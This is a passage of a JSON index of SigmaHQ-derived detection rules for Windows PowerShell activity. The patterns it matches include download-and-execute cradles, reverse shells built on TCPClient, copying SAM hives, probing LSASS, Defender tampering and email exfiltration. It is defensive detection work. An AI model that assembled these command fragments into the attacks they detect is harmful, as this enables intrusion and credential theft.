Security Monitoring\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects attackers attempting to disable Windows Defender using Powershell\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_disable_defender_av_security_monitoring.yml", "version": "0.2", "versions": {"0.1": {"digest": "445a26769f40f940b8f63a0eedd6c625f8b6ab4d47d736ff677754a4fe17231e"}, "0.2": {"digest": "f5a49bcbcc55a8288b55b49ef01c60a6fd23c2839cdbba4bb4be0b30e8b6433a"}}}, "sigmahq/proc_creation_win_powershell_disable_ie_features": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_disable_ie_features\ndescription: |\n  Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' -name IEHarden ' && evt.Parsed.CommandLine contains ' -value 0 ' || evt.Parsed.CommandLine contains ' -name DEPOff ' && evt.Parsed.CommandLine contains ' -value 1 ' || evt.Parsed.CommandLine contains ' -name DisableFirstRunCustomize ' && evt.Parsed.CommandLine contains ' -value 2 ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Disabled IE Security Features\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_disable_ie_features.yml", "version": "0.2", "versions": {"0.1": {"digest": "87524eb707c2154a3ac35904c44b1106d7785ac3841fc851a700bfb40c43aa98"}, "0.2": {"digest": "e7c417923172d03792ddccc6c9c785ab582cf83d71731a5e68f5a7d6559944c6"}}}, "sigmahq/proc_creation_win_powershell_download_cradle_obfuscated": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_download_cradle_obfuscated\ndescription: |\n  Detects the execution of a specific OneLiner to download and execute powershell modules in memory.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\powershell.exe' && evt.Parsed.CommandLine contains 'http://127.0.0.1' && evt.Parsed.CommandLine contains '%{(IRM $_)}' && evt.Parsed.CommandLine contains '.SubString.ToString()[67,72,64]-Join' && evt.Parsed.CommandLine contains 'Import-Module')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1562.001\n\n  label: \"Obfuscated PowerShell OneLiner Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a specific OneLiner to download and execute powershell modules in memory.\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_download_cradle_obfuscated.yml", "version": "0.2", "versions": {"0.1": {"digest": "e03b0c51f628f167316eb093922a8f8a1630a93bdf484d518093d47fafb54347"}, "0.2": {"digest": "8056846bb1c7abd4c8bfada5cb9325093aa1158a03c873a994a0ef7f797449a2"}}}, "sigmahq/proc_creation_win_powershell_download_iex": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_download_iex\ndescription: |\n  Detects PowerShell download and execution cradles.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains '.DownloadString(' || evt.Parsed.CommandLine contains '.DownloadFile(' || evt.Parsed.CommandLine contains 'Invoke-WebRequest ' || evt.Parsed.CommandLine contains 'iwr ') && (evt.Parsed.CommandLine contains ';iex $' || evt.Parsed.CommandLine contains '| IEX' || evt.Parsed.CommandLine contains '|IEX ' || evt.Parsed.CommandLine contains 'I`E`X' || evt.Parsed.CommandLine contains 'I`EX' || evt.Parsed.CommandLine contains 'IE`X' || evt.Parsed.CommandLine contains 'iex ' || evt.Parsed.CommandLine contains 'IEX (' || evt.Parsed.CommandLine contains 'IEX(' || evt.Parsed.CommandLine contains 'Invoke-Expression'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"PowerShell Download and Execution Cradles\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects PowerShell download and execution cradles.\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_download_iex.yml", "version": "0.2", "versions": {"0.1": {"digest": "125dbd5ba356a9554ee6d6a6dfa7d7bf8870396250e10e7f0b9164bc931cf65f"}, "0.2": {"digest": "7ea09557c54fc9e7477267e6bb3b06523cd5e4bb7d19fb83c43cf72d0d5758a7"}}}, "sigmahq/proc_creation_win_powershell_email_exfil": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_email_exfil\ndescription: |\n  Detects email exfiltration via powershell cmdlets\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && evt.Parsed.CommandLine contains 'Add-PSSnapin' && evt.Parsed.CommandLine contains 'Get-Recipient' && evt.Parsed.CommandLine contains '-ExpandProperty' && evt.Parsed.CommandLine contains 'EmailAddresses' && evt.Parsed.CommandLine contains 'SmtpAddress' && evt.Parsed.CommandLine contains '-hidetableheaders')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Email Exifiltration Via Powershell\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects email exfiltration via powershell cmdlets\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_email_exfil.yml", "version": "0.2", "versions": {"0.1": {"digest": "7f29069e62175e3ac0afcd2e94c14b2ccd221182828ad0cff866c1a90e785b82"}, "0.2": {"digest": "17d1662af3ea2a47cbe765456341fd668f025de85c2d9698d61792339b604e74"}}}, "sigmahq/proc_creation_win_powershell_frombase64string": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_frombase64string\ndescription: |\n  Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '::FromBase64String(')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1140\n   - attack.t1059.001\n\n  label: \"Base64 Encoded PowerShell Command Detected\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_frombase64string.yml", "version": "0.2", "versions": {"0.1": {"digest": "eb64e3f53f8d04e3bc22c285ae7b302c90cd8216fdcbfd6803202e1e7ce2c2e2"}, "0.2": {"digest": "9346ff8beea1a6631b866c9f96bff32a11371bb4f43de318cf7e235a55bdbaab"}}}, "sigmahq/proc_creation_win_powershell_getprocess_lsass": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_getprocess_lsass\ndescription: |\n  Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'Get-Process lsas' || evt.Parsed.CommandLine contains 'ps lsas' || evt.Parsed.CommandLine contains 'gps lsas')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1552.004\n\n  label: \"PowerShell Get-Process LSASS\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_getprocess_lsass.yml", "version": "0.2", "versions": {"0.1": {"digest": "4d0342c8d52f73c184d2e02de544b6dc6677608c44cf2d620222ae37163c8f8d"}, "0.2": {"digest": "233730c3be8dfb6ac964d02cb3099948b9edc0f342deab35c7111d6b29d57058"}}}, "sigmahq/proc_creation_win_powershell_hide_services_via_set_service": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_hide_services_via_set_service\ndescription: |\n  Detects usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName == 'pwsh.dll') && evt.Parsed.CommandLine contains 'Set-Service ' && evt.Parsed.CommandLine contains 'DCLCWPDTSD' && (evt.Parsed.CommandLine contains '-SecurityDescriptorSddl ' || evt.Parsed.CommandLine contains '-sd '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.011\n\n  label: \"Abuse of Service Permissions to Hide Services Via Set-Service\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_hide_services_via_set_service.yml", "version": "0.2", "versions": {"0.1": {"digest": "3f611fe1849ee99278a783cd1f0db331e7b87c8350dd298157c3814bad9cd549"}, "0.2": {"digest": "4578323ecb1f666aa4e05ed80e743694abf2b4b9e6c0eca2608fc4175af45cd0"}}}, "sigmahq/proc_creation_win_powershell_iex_patterns": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_iex_patterns\ndescription: |\n  Detects suspicious ways to run Invoke-Execution using IEX alias\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && (evt.Parsed.CommandLine contains ' | iex;' || evt.Parsed.CommandLine contains ' | iex ' || evt.Parsed.CommandLine contains ' | iex}' || evt.Parsed.CommandLine contains ' | IEX ;' || evt.Parsed.CommandLine contains ' | IEX -Error' || evt.Parsed.CommandLine contains ' | IEX (new' || evt.Parsed.CommandLine contains ');IEX ') && (evt.Parsed.CommandLine contains '::FromBase64String' || evt.Parsed.CommandLine contains '.GetString([System.Convert]::') || evt.Parsed.CommandLine contains ')|iex;$' || evt.Parsed.CommandLine contains ');iex($' || evt.Parsed.CommandLine contains ');iex $' || evt.Parsed.CommandLine contains ' | IEX | ' || evt.Parsed.CommandLine contains ' | iex\\\\\"')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Suspicious PowerShell IEX Execution Patterns\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious ways to run Invoke-Execution using IEX alias\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_iex_patterns.yml", "version": "0.2", "versions": {"0.1": {"digest": "5773ee35983026288cdac282e098649dafaec492c85c403f58c07d8451579562"}, "0.2": {"digest": "295ce6d0dc6efd5ccae1a9e82227786fbc141d451dc6068811ff0a65d198e899"}}}, "sigmahq/proc_creation_win_powershell_import_cert_susp_locations": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_import_cert_susp_locations\ndescription: |\n  Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'Import-Certificate' && evt.Parsed.CommandLine contains ' -FilePath ' && evt.Parsed.CommandLine contains 'Cert:\\\\LocalMachine\\\\Root' && (evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\TEMP\\\\' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Perflogs\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Public\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1553.004\n\n  label: \"Root Certificate Installed From Susp Locations\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_import_cert_susp_locations.yml", "version": "0.2", "versions": {"0.1": {"digest": "08fde16774ee3f683f983ba22c485bcdde537b45f2950f363666c2fc88c63457"}, "0.2": {"digest": "8b515a2fbfe2f39d0e27a37a4571214ff13178bd8b789dea3bec39c2ac615359"}}}, "sigmahq/proc_creation_win_powershell_mailboxexport_share": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_mailboxexport_share\ndescription: |\n  Detects usage of the powerShell New-MailboxExportRequest Cmdlet to exports a mailbox to a remote or local share, as used in ProxyShell exploitations\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'New-MailboxExportRequest' && evt.Parsed.CommandLine contains ' -Mailbox ' && evt.Parsed.CommandLine contains ' -FilePath \\\\\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious PowerShell Mailbox Export to Share\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the powerShell New-MailboxExportRequest Cmdlet to exports a mailbox to a remote or local share, as used in ProxyShell exploitations\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_mailboxexport_share.yml", "version": "0.2", "versions": {"0.1": {"digest": "10e565ab1082f89ad91e983769c5aaeae571e177bea0d18d2671049409d924c0"}, "0.2": {"digest": "b4854a0f500ad55834f31afce29a08d61b391ec88609b407d6815cd28d8a2633"}}}, "sigmahq/proc_creation_win_powershell_obfuscation_via_utf8": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_obfuscation_via_utf8\ndescription: |\n  Detects suspicious encoded character syntax often used for defense evasion\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '(WCHAR)0x')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1027\n\n  label: \"Potential PowerShell Obfuscation Via WCHAR\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious encoded character syntax often used for defense evasion\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_obfuscation_via_utf8.yml", "version": "0.2", "versions": {"0.1": {"digest": "19c74bf0c6ea09a368f5506aae9e76edf448c2276f8c29841aea6f7af4609321"}, "0.2": {"digest": "f57c7bae8c606b2247dbdce5a8424ffff4f54c0ee22a4ebac277e55cef0c4c22"}}}, "sigmahq/proc_creation_win_powershell_public_folder": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_public_folder\ndescription: |\n  This rule detects execution of PowerShell scripts located in the \"C:\\Users\\Public\" folder\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && (evt.Parsed.CommandLine contains '-f C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '-f \"C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '-f %Public%' || evt.Parsed.CommandLine contains '-fi C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '-fi \"C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '-fi %Public%' || evt.Parsed.CommandLine contains '-fil C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '-fil \"C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '-fil %Public%' || evt.Parsed.CommandLine contains '-file C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '-file \"C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '-file %Public%'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Execution of Powershell Script in Public Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "This rule detects execution of PowerShell scripts located in the \"C:\\Users\\Public\" folder\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_public_folder.yml", "version": "0.2", "versions": {"0.1": {"digest": "4f59bd2f3ce331769e6e30e4834ef19d0715ce123a0bc68279f7807dd3269c2b"}, "0.2": {"digest": "08a2f73d67f473d5aa99eed5994a73eb49a4a5dda4bf86aefa28303709df138a"}}}, "sigmahq/proc_creation_win_powershell_remotefxvgpudisablement_abuse": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_remotefxvgpudisablement_abuse\ndescription: |\n  Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'Invoke-ATHRemoteFXvGPUDisablementCommand' || evt.Parsed.CommandLine contains 'Invoke-ATHRemoteFXvGPUDisableme')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects calls to the AtomicTestHarnesses \"Invoke-ATHRemoteFXvGPUDisablementCommand\" which is designed to abuse the \"RemoteFXvGPUDisablement.exe\" binary to run custom PowerShell code via module load-order hijacking.\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_remotefxvgpudisablement_abuse.yml", "version": "0.2", "versions": {"0.1": {"digest": "ee36a40e42be27cab9946ca288534adb3d5a2e31b7c38dc6a78cc1a87f8bdf00"}, "0.2": {"digest": "c5b0ada4e42343d5381a7628b362ffa1d61ec355e66c9dfb53fd94e5607d8e55"}}}, "sigmahq/proc_creation_win_powershell_remove_mppreference": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_remove_mppreference\ndescription: |\n  Detects attempts to remove Windows Defender configurations using the 'MpPreference' cmdlet\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'Remove-MpPreference' && (evt.Parsed.CommandLine contains '-ControlledFolderAccessProtectedFolders ' || evt.Parsed.CommandLine contains '-AttackSurfaceReductionRules_Ids ' || evt.Parsed.CommandLine contains '-AttackSurfaceReductionRules_Actions ' || evt.Parsed.CommandLine contains '-CheckForSignaturesBeforeRunningScan '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Tamper Windows Defender Remove-MpPreference\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects attempts to remove Windows Defender configurations using the 'MpPreference' cmdlet\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_remove_mppreference.yml", "version": "0.2", "versions": {"0.1": {"digest": "c8f57462a441c7a1bead1fe7b7dfc5a2c446ae5a408bd2476fcc76742a0abcda"}, "0.2": {"digest": "3504b556f2b8c28f7495bae03096875c3c594547690cd93ab2c39593b1f1a6b1"}}}, "sigmahq/proc_creation_win_powershell_reverse_shell_connection": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_reverse_shell_connection\ndescription: |\n  Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll'] || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && evt.Parsed.CommandLine contains ' Net.Sockets.TCPClient' && evt.Parsed.CommandLine contains '.GetStream(' && evt.Parsed.CommandLine contains '.Write(')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Potential Powershell ReverseShell Connection\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other.\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_reverse_shell_connection.yml", "version": "0.2", "versions": {"0.1": {"digest": "63223e30e049d3a8e33d911242e532ece9ef1de414ff54f458264d39d3d5e52d"}, "0.2": {"digest": "dbe47307cacea944d015d067477cf7f15d59e55fc9f59570f38dd0cf2d4bb06a"}}}, "sigmahq/proc_creation_win_powershell_run_script_from_ads": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_run_script_from_ads\ndescription: |\n  Detects PowerShell script execution from Alternate Data Stream (ADS)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe') && (evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && evt.Parsed.CommandLine contains 'Get-Content' && evt.Parsed.CommandLine contains '-Stream')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1564.004\n\n  label: \"Run PowerShell Script from ADS\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects PowerShell script execution from Alternate Data Stream (ADS)\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_run_script_from_ads.yml", "version": "0.2", "versions": {"0.1": {"digest": "50849c9694a219619a40b0853e54a728cde79c1232e031e452458358cf6878e4"}, "0.2": {"digest": "0592553c0744812c34b75853823a164d5e836d5f34a70c0ae2d9ae846fc176d8"}}}, "sigmahq/proc_creation_win_powershell_run_script_from_input_stream": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_run_script_from_input_stream\ndescription: |\n  Detects PowerShell script execution via input stream redirect\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && evt.Parsed.CommandLine matches '\\\\s-\\\\s*<')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Run PowerShell Script from Redirected Input Stream\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects PowerShell script execution via input stream redirect\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_run_script_from_input_stream.yml", "version": "0.2", "versions": {"0.1": {"digest": "b08e4c3f8f5258f443193929ec0457a1e8bb696b9a5020ec183eaf010f5b7187"}, "0.2": {"digest": "09b5763de3d3930603c0eaf0be0166d9b60c2c86b0fc2427c5e90b6e3df3d4d9"}}}, "sigmahq/proc_creation_win_powershell_sam_access": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_sam_access\ndescription: |\n  Detects suspicious PowerShell scripts accessing SAM hives\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\HarddiskVolumeShadowCopy' && evt.Parsed.CommandLine contains 'System32\\\\config\\\\sam' && (evt.Parsed.CommandLine contains 'Copy-Item' || evt.Parsed.CommandLine contains 'cp $_.' || evt.Parsed.CommandLine contains 'cpi $_.' || evt.Parsed.CommandLine contains 'copy $_.' || evt.Parsed.CommandLine contains '.File]::Copy('))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.002\n\n  label: \"PowerShell SAM Copy\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious PowerShell scripts accessing SAM hives\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_sam_access.yml", "version": "0.2", "versions": {"0.1": {"digest": "deccdb4824157a077add74c0c871644199873e45369d877dea5423a27cb1bf19"}, "0.2": {"digest": "8fccf8f35b244bd5166b9794dbd6dcc5058dd5b43bf8ed317547580343b68b19"}}}, "sigmahq/proc_creation_win_powershell_service_dacl_modification_set_service": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_service_dacl_modification_set_service\ndescription: |\n  Detects suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName == 'pwsh.dll') && (evt.Parsed.CommandLine contains '-SecurityDescriptorSddl ' || evt.Parsed.CommandLine contains '-sd ') && evt.Parsed.CommandLine contains 'Set-Service ' && evt.Parsed.CommandLine contains 'D;;' && (evt.Parsed.CommandLine contains ';;;IU' || evt.Parsed.CommandLine contains ';;;SU' || evt.Parsed.CommandLine contains ';;;BA' || evt.Parsed.CommandLine contains ';;;SY' || evt.Parsed.CommandLine contains ';;;WD'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1543.003\n\n  label: \"Suspicious Service DACL Modification Via Set-Service Cmdlet\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_service_dacl_modification_set_service.yml", "version": "0.2", "versions": {"0.1": {"digest": "340add5c13d86d0dcf8dcdda228db3c4ba064806ad640451e7cd3d40603cede6"}, "0.2": {"digest": "dd7af8364899f76730509ccead0611b6d2b9159fa5f46697b165de8df40b3f88"}}}, "sigmahq/proc_creation_win_powershell_set_acl": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_set_acl\ndescription: |\n  Detects PowerShell execution to set the ACL of a file or a folder\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll'] || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && evt.Parsed.CommandLine contains 'Set-Acl ' && evt.Parsed.CommandLine contains '-AclObject ' && evt.Parsed.CommandLine contains '-Path ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"PowerShell Script Change Permission Via Set-Acl\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects PowerShell execution to set the ACL of a file or a folder\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_set_acl.yml", "version": "0.2", "versions": {"0.1": {"digest": "fc861f4742bff212673f6864c136828176f442667c956ba45d40fb3483e8e19a"}, "0.2": {"digest": "b72dba48b8594e86b56658674e5fa4b284c75537e91df77dce6be6c29976d36b"}}}, "sigmahq/proc_creation_win_powershell_set_acl_susp_location": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_set_acl_susp_location\ndescription: |\n  Detects PowerShell scripts to set the ACL to a file in the Windows folder\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll'] || evt.Parsed.Image 